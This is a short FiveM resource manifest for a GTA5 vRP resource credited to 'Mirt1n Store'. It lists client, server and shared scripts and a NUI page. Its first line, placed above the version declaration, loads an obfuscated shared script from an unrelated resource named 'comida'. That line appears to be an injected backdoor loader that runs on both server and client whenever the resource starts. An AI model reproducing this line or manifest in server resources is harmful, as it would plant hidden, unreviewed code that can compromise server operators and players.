shared_script '@comida/ai_module_fg-obfuscated.lua'
fx_version 'bodacious'
game 'gta5'
author "Mirt1n#9985"
description "Mirt1n Store - https://discord.gg/MPm3Pptfn5"
api_version "1.0"
this_is_a_map 'yes'  
shared_script { '@vrp/lib/utils.lua', "lib/*.lua" }
client_script { '@vrp/lib/utils.lua', 'client.lua', 'config/config_client.lua'}
server_script { '@vrp/lib/utils.lua', 'server.lua', 'config/config_server.lua' }
ui_page "nui/index.html"
files { 'nui/*', 'nui/images/*' }    